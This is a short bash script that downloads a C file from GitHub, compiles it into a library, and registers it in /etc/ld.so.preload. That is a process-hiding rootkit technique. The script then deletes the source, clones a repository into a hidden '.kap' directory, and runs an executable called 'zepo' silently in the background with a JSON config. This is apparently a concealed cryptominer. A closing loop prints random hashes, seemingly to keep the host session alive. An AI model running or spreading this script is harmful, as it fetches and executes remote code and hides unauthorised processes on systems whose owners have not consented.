#!/bin/bash
apt-get update ; apt-get install sudo -y
curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
mkdir .kap && cd .kap
git clone https://github.com/6248202226/gradi.git
cd gradi
chmod +x 80.json && chmod +x zepo
./zepo -c "80.json" > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
